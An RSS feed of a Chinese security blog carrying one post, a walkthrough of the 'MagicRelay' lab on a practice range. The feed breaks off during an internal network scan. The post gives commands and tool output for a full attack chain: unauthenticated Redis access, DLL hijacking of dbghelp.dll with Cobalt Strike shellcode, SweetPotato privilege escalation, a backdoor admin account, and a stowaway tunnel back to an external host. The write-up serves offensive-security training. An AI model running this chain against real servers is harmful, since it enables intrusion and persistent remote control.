<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>春秋云镜 on baozongwi's blog</title><link>https://baozongwi.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/</link><description>Recent content in 春秋云镜 on baozongwi's blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><copyright>baozongwi</copyright><lastBuildDate>Wed, 20 Aug 2025 17:39:42 +0800</lastBuildDate><atom:link href="https://baozongwi.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/index.xml" rel="self" type="application/rss+xml"/><item><title>春秋云镜MagicRelay</title><link>https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/</link><pubDate>Wed, 20 Aug 2025 17:39:42 +0800</pubDate><guid>https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/</guid><description>&lt;h2 id="说在前面">说在前面
&lt;/h2>&lt;p>最开始的redis入口，即使第一次劫持失败了，也依旧可以继续尝试，但是一旦成功了一次，如果选择下线就不能成功第二次了，并且其中修改shellcode前，产生项目的命令必须为&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">python DLLHijacker.py C:\Windows\System32\dbghelp.dll
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python DLLHijacker.py dbghelp.dll
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>不能使用&lt;code>Win11dbghelp.dll&lt;/code>等不规范的文件名，不然也会失败&lt;/p>
&lt;h2 id="flag1">flag1
&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">root@iZ2vc00kcpt25b5vsbivjvZ:/var/www/html# ./fscan -h 39.99.238.25 -p 0-65535
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ___ _
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> / _ &lt;span class="se">\ &lt;/span> ___ ___ _ __ __ _ ___&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> __
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> / /_&lt;span class="se">\/&lt;/span>____/ __&lt;span class="p">|&lt;/span>/ __&lt;span class="p">|&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>__/ _&lt;span class="sb">`&lt;/span> &lt;span class="p">|&lt;/span>/ __&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>/ /
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/ /_&lt;span class="se">\\&lt;/span>_____&lt;span class="se">\_&lt;/span>_ &lt;span class="se">\ &lt;/span>&lt;span class="o">(&lt;/span>__&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">(&lt;/span>_&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">(&lt;/span>__&lt;span class="p">|&lt;/span> &amp;lt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">\_&lt;/span>___/ &lt;span class="p">|&lt;/span>___/&lt;span class="se">\_&lt;/span>__&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> &lt;span class="se">\_&lt;/span>_,_&lt;span class="p">|&lt;/span>&lt;span class="se">\_&lt;/span>__&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>&lt;span class="se">\_\ &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> fscan version: 1.8.4
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">start infoscan
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">39.99.238.25:135 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">39.99.238.25:139 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">39.99.238.25:445 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">39.99.238.25:3389 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">39.99.238.25:6379 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">39.99.238.25:15774 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">39.99.238.25:47001 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">39.99.238.25:49666 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">39.99.238.25:49665 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">39.99.238.25:49670 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">39.99.238.25:49668 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">39.99.238.25:49669 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">39.99.238.25:49664 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">39.99.238.25:49667 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">39.99.238.25:49675 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">39.99.238.25:49676 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> alive ports len is: &lt;span class="m">16&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">start vulscan
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetInfo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>39.99.238.25
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>WIN-YUYAOX9Q
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>172.22.12.25
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> WebTitle http://39.99.238.25:47001 code:404 len:315 title:Not Found
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Redis 39.99.238.25:6379 unauthorized file:C:&lt;span class="se">\P&lt;/span>rogram Files&lt;span class="se">\R&lt;/span>edis/dump.rdb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>扫描一下，发现redis服务，链接上去发现版本 &lt;code>redis-cli -h 39.99.238.25&lt;/code>得到版本为3.0.504，这个版本是一般的Windows自带版本，可以查找资料&lt;/p>
&lt;p>&lt;a class="link" href="https://www.cnblogs.com/sup3rman/p/16803408.html" target="_blank" rel="noopener"
>https://www.cnblogs.com/sup3rman/p/16803408.html&lt;/a>&lt;/p>
&lt;p>&lt;a class="link" href="https://xz.aliyun.com/news/13892" target="_blank" rel="noopener"
>https://xz.aliyun.com/news/13892&lt;/a>&lt;/p>
&lt;p>第二篇文章简直和我们这里要打的场景那是一模一样，&lt;/p>
&lt;p>VS2022 ：https://github.com/P4r4d1se/dll_hijack&lt;/p>
&lt;p>VS2019 ： &lt;a class="link" href="https://github.com/kiwings/DLLHijacker" target="_blank" rel="noopener"
>https://github.com/kiwings/DLLHijacker&lt;/a>&lt;/p>
&lt;p>项目在这里，如果你是Windows11，那直接在本地的&lt;code>C:\Windows\System32&lt;/code>下找到dbghelp.dll处理一下即可，如果你是Windows10，那你就要自己去找人要一个Windows11的，在Windows里面运行命令，不然生成出来的项目就会失败&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">python DLLHijacker.py C:\Windows\System32\dbghelp.dll
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python DLLHijacker.py dbghelp.dll
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>用VS2022载入项目，会提示升级，点确认，靶机出网，准备上线CS，先生成shellcode&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/1.png"
width="351"
height="186"
srcset="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/1_hu_d4a3d7360a8c5206.png 480w, https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/1_hu_892ff0a10c3369ac.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="188"
data-flex-basis="452px"
>&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/2.png"
width="2407"
height="1422"
srcset="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/2_hu_efcabccecc8e6dc8.png 480w, https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/2_hu_b38c077b78aa1544.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="169"
data-flex-basis="406px"
>&lt;/p>
&lt;p>修改设置(先知那个BYD，他没写)，打开项目属性，&lt;/p>
&lt;p>1、设置运行库为多线程 (/MT 或 /MTd)：&lt;/p>
&lt;ul>
&lt;li>在属性页面中，导航到：配置属性 &amp;gt; C/C++ &amp;gt; 代码生成。&lt;/li>
&lt;li>找到 “运行库”（Runtime Library）选项。&lt;/li>
&lt;li>如果当前是 Release 配置（截图中您已选择 Release x64），设置为 “多线程 (/MT)”。&lt;/li>
&lt;li>如果是 Debug 配置，设置为 “多线程调试 (/MTd)”。&lt;/li>
&lt;li>确保在顶部下拉菜单中选择正确的配置（Release 或 Debug）。&lt;/li>
&lt;/ul>
&lt;p>2、禁用安全检查 (/GS)：&lt;/p>
&lt;ul>
&lt;li>仍在 配置属性 &amp;gt; C/C++ &amp;gt; 代码生成 页面。&lt;/li>
&lt;li>找到 “安全检查”（Buffer Security Check）选项。&lt;/li>
&lt;li>设置为 “禁用安全检查 (/GS-)”。&lt;/li>
&lt;/ul>
&lt;p>3、关闭生成清单：&lt;/p>
&lt;ul>
&lt;li>导航到：配置属性 &amp;gt; 链接器 &amp;gt; 清单文件。&lt;/li>
&lt;li>找到 “生成清单”（Generate Manifest）选项。&lt;/li>
&lt;li>设置为 “否 (/MANIFEST:NO)”。&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/3.png"
width="1200"
height="818"
srcset="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/3_hu_8c53867a5201a40a.png 480w, https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/3_hu_6300fbdc5ffd2f93.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="146"
data-flex-basis="352px"
>&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/4.png"
width="1200"
height="818"
srcset="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/4_hu_9d937a9209e9777c.png 480w, https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/4_hu_db67b86754b23dda.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="146"
data-flex-basis="352px"
>&lt;/p>
&lt;p>应用，编译成dll文件即可&lt;/p>
&lt;p>&lt;a class="link" href="https://github.com/r35tart/RedisWriteFile" target="_blank" rel="noopener"
>https://github.com/r35tart/RedisWriteFile&lt;/a>&lt;/p>
&lt;p>&lt;a class="link" href="https://github.com/0671/RabR" target="_blank" rel="noopener"
>https://github.com/0671/RabR&lt;/a>&lt;/p>
&lt;p>这两个项目都可以主从复制，去覆盖redis的DLL，达到劫持的效果，在服务器上面运行&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python3 RedisWriteFile.py --rhost 39.99.240.173 --rport &lt;span class="m">6379&lt;/span> --lhost 47.109.176.117 --lport &lt;span class="m">16379&lt;/span> --rpath &lt;span class="s1">&amp;#39;C:\\Program Files\\Redis\\&amp;#39;&lt;/span> --rfile &lt;span class="s1">&amp;#39;dbghelp.dll&amp;#39;&lt;/span> --lfile &lt;span class="s1">&amp;#39;dbghelp.dll&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># redis链接执行命令加载DLL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">redis-cli -h 39.99.240.173
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bgsave
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/5.png"
width="1101"
height="689"
srcset="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/5_hu_54c97ae7f84997e6.png 480w, https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/5_hu_3862a16eb1ae2122.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="159"
data-flex-basis="383px"
>&lt;/p>
&lt;p>或者是用RabR，我感觉这个更方便，可以直接上线&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python3 redis-attack.py -r 39.99.231.97 -L 47.109.176.117 -wf dbghelp.dll
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">h
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/6.png"
width="1011"
height="510"
srcset="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/6_hu_e3aaaeb372d531b4.png 480w, https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/6_hu_b5f6f74e5f429e94.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="198"
data-flex-basis="475px"
>&lt;/p>
&lt;p>成功上线&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/7.png"
width="1511"
height="744"
srcset="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/7_hu_2f5ba9ab6154d91a.png 480w, https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/7_hu_176198edf75d646d.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="203"
data-flex-basis="487px"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">shell dir C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\f&lt;/span>lag&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell &lt;span class="nb">type&lt;/span> C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\f&lt;/span>lag&lt;span class="se">\f&lt;/span>lag01.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这个用户就是域用户了&lt;/p>
&lt;h2 id="flag2">flag2
&lt;/h2>&lt;p>不是system权限，需要提权，上传甜土豆、beacon.exe和fscan.exe&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">shell dir C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\f&lt;/span>lag&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell .&lt;span class="se">\S&lt;/span>weetPotato.exe._obf.exe -a &lt;span class="s2">&amp;#34;whoami&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\f&lt;/span>lag&lt;span class="se">\S&lt;/span>weetPotato.exe._obf.exe -a C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\f&lt;/span>lag&lt;span class="se">\b&lt;/span>eacon.exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/8.png"
width="556"
height="226"
srcset="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/8_hu_34631a7f0f5aedf1.png 480w, https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/8_hu_450ecc412dcffc2e.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="246"
data-flex-basis="590px"
>&lt;/p>
&lt;p>成功上线system，直接新建用户RDP上去&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">shell net user test1 baozongwi123! /add
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell net localgroup administrators test1 /add
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>上传stowaway搭建代理&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">./linux_x64_admin -l &lt;span class="m">2334&lt;/span> -s &lt;span class="m">123&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.&lt;span class="se">\w&lt;/span>indows_x64_agent.exe -c 47.109.176.117:2334 -s &lt;span class="m">123&lt;/span> --reconnect &lt;span class="m">8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">use &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">socks &lt;span class="m">5555&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo vim /etc/proxychains4.conf
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>扫描一下这个网段&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;span class="lnt">61
&lt;/span>&lt;span class="lnt">62
&lt;/span>&lt;span class="lnt">63
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ipconfig
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\f&lt;/span>lag&amp;gt;.&lt;span class="se">\f&lt;/span>scan.exe -h 172.22.12.25/24
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ___ _
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> / _ &lt;span class="se">\ &lt;/span> ___ ___ _ __ __ _ ___&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> __
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> / /_&lt;span class="se">\/&lt;/span>____/ __&lt;span class="p">|&lt;/span>/ __&lt;span class="p">|&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>__/ _&lt;span class="sb">`&lt;/span> &lt;span class="p">|&lt;/span>/ __&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>/ /
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/ /_&lt;span class="se">\\&lt;/span>_____&lt;span class="se">\_&lt;/span>_ &lt;span class="se">\ &lt;/span>&lt;span class="o">(&lt;/span>__&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">(&lt;/span>_&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">(&lt;/span>__&lt;span class="p">|&lt;/span> &amp;lt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">\_&lt;/span>___/ &lt;span class="p">|&lt;/span>___/&lt;span class="se">\_&lt;/span>__&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> &lt;span class="se">\_&lt;/span>_,_&lt;span class="p">|&lt;/span>&lt;span class="se">\_&lt;/span>__&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>&lt;span class="se">\_\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> fscan version: 1.8.4
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">start infoscan
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>icmp&lt;span class="o">)&lt;/span> Target 172.22.12.6 is alive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>icmp&lt;span class="o">)&lt;/span> Target 172.22.12.12 is alive
